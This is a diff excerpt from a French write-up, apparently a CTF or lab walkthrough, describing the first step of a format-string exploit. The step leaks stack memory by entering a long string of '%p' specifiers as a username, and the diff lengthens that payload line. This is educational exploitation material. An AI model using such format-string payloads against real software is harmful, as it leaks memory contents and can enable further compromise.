@@ -19,7 +19,7 @@ Le but est d'utiliser la vulnérabilité pour faire fuiter (leak) la mémoire de
 
 ### Étape 1 : Fuite de mémoire
 Nous injectons une série de "%p" (environ 25) pour scanner la pile :
-Saisie Username : %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+Saisie Username : %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
 
 %p = 25 70 en hexa
 
